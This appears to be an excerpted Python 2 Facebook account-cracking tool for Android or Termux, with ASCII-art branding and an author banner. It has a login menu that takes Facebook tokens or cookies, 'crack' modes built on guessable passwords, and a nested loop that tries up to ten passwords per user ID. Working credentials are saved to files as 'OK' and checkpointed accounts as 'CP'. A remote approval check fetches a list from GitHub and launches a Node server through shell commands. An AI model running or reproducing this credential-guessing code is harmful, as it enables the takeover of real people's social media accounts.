...
__author__ = 'malick'
__copyright = 'All rights reserved . Copyright  SHAR'
...
def reg():
    ...
    time.sleep(1)
    try:
        to = open('/sdcard/.shar.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/TheSarfraz-S/THE-SARFRAZ-SHAR/main/server.txt').text
    if to in r:
         os.system('cd SARFARAZ && npm install')
         os.system('fuser -k 5000/tcp &')
         os.system('#')
         os.system('cd SARFARAZ && node index.js &')
         time.sleep(5)
         ip()
    else:
        os.system('clear')
        ...
        print ' \x1b[0;33;40mYour Id Is Not Approved Already '
        print ' \x1b[0;33;40mCopy the id and send to admin'
        print ' \x1b[0;33;40mYour id: ' + to
        raw_input('\x1b[0;33;40m Press enter to send id')
        os.system('xdg-open https://www.facebook.com/Bittu2002.BR')
        reg()
...
def reg2():
    ...
    print ' \x1b[0;33;40mCOPY AND PRESS ENTER THEN SELECT FACEBOOK TO CONTINUE'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' PRESS ENTER TO GO TO FACEBOOK')
    os.system('xdg-open https://www.facebook.com/Bittu2002.BR')
    sav = open('/sdcard/.shar.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[0;33;40m PRESS ENTER TO CHECK APPROVAL ')
    reg()
...
logo = """
  ...
  sSSs   .S_SSSs     .S_sSSs                  
 d%%SP  .SS~SSSSS   .SS~YS%%b                 
d%S'    S%S   SSSS  S%S   `S%b                
S%|     S%S    S%S  S%S    S%S                
S&S     S%S SSSS%S  S%S    d*S                
Y&Ss    S&S  SSS%S  S&S   .S*S                
...
YSS'    SSS    S*S  S*S    SSS                
  ...
  sSSs   .S_sSSs     .S_SSSs     sdSSSSSSSbs  
 d%%SP  .SS~YS%%b   .SS~SSSSS    YSSSSSSSS%S  
d%S'    S%S   `S%b  S%S   SSSS          S%S   
S%S     S%S    S%S  S%S    S%S         S&S    
S&S     S%S    d*S  S%S SSSS%S        S&S     
S&S_Ss  S&S   .S*S  S&S  SSS%S        S&S     
S&S~SP  S&S_sdSSS   S&S    S&S       S&S      
S&S     S&S~YSY%b   S&S    S&S      S*S       
S*b     S*S   `S%b  S*S    S&S     S*S        
S*S     S*S    S%S  S*S    S*S   .s*S         
S*S     S*S    S&S  S*S    S*S   sY*SSSSSSSP  
S*S     S*S    SSS  SSS    S*S  sY*SSSSSSSSP  
SP      SP                 SP                 
Y       Y                  Y                  
                                              
\033[1;96m--------------------------------------------------
\033[1;92m(!)\033[1;92m Author   : Malick Azeem
\033[1;92m(!)\033[1;92m Fb       : Malick Azeem
\033[1;92m(!)\033[1;92m MADE IN SINDH PAKISTAN
\033[1;96m--------------------------------------------------
"""
...
def log_menu():
    try:
        ...
        os.system('clear')
        print logo
        print '\x1b[1;94m ~~~~ Login menu ~~~~\x1b[1;91m'
        print 47 * '-'
        print '\x1b[1;93m[1] Login with FaceBook'
        print '\x1b[1;93m[2] Login with token'
        print '\x1b[1;93m[3] Login with cookies'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input(' \x1b[1;94m\xe2\x95\xb0\xe2\x94\x80SARFRAZ\xe2\x9e\xa4 ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
...
def menu():
    ...
    os.system('clear')
    print logo
    tok = open('/sdcard/.Shar.txt', 'r').read()
    print '  \x1b[1;97mLogged in user: \x1b[1;91m' + z
    print 47 * '-'
    print ' \x1b[1;92m Active token: \x1b[1;91m' + tok
    print ' ------------------------------------------ '
    print '\x1b[1;94m[1] Crack with Auto password 15'
    print '\x1b[1;94m[2] Crack with Number password 6'
    print '\x1b[1;94m[3] Crack with Name + Number password 8'
    print '\x1b[1;94m[4] Extract File'
    print '\x1b[1;94m[5] Logout'
    print '\x1b[1;94m[6] Delete trash files'
    menu_s()
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \x1b[1;97m\xe2\x95\xb0\xe2\x94\x80Malick\xe2\x9e\xa4 ')
    if a_s == '1':
        os.system('clear')
        print logo
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;92m{Malick Azeem }\x1b[1;91m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[Malick-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('/sdcard/ids/Malick_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[Malick-CP] ' + uid + ' | ' + pass1
                cp = open('Malick_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[Malick-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('/sdcard/ids/Malick_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[Malick-CP] ' + uid + ' | ' + pass2
                    cp = open('Malick_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[Malick-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('/sdcard/ids/Malick_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[Malick-CP] ' + uid + ' | ' + pass3
                        cp = open('Malick_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[Malick-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('/sdcard/ids/Malick_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[Malick-CP] ' + uid + ' | ' + pass4
                            cp = open('Malick_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            ...
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[Malick-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('/sdcard/ids/Malick_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[Malick-CP] ' + uid + ' | ' + pass5
                                cp = open('Malick_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                ...
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[Malick-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('/sdcard/ids/Malick_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[Malick-CP] ' + uid + ' | ' + pass6
                                    cp = open('Malick_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    ...
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[Malick-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('/sdcard/ids/Malick_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[Malick-CP] ' + uid + ' | ' + pass7
                                        cp = open('Malick_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        ...
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[Malick-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('/sdcard/ids/Malick_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[Malick-CP] ' + uid + ' | ' + pass8
                                            cp = open('Malick_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            ...
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[Malick-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('/sdcard/ids/Malick_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[Malick-CP] ' + uid + ' | ' + pass9
                                                cp = open('Malick_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                ...
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[Malick-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('/sdcard/ids/Malick_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[Malick-CP] ' + uid + ' | ' + pass10
                                                    cp = open('Malick_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
...
def c_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94m{ Malick Azeem}\x1b[1;91m'
    print 47 * '-'
...
def n_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;94m{SHAR SARFRAZ SARFRAZ}\x1b[1;91m'
    print 47 * '-'
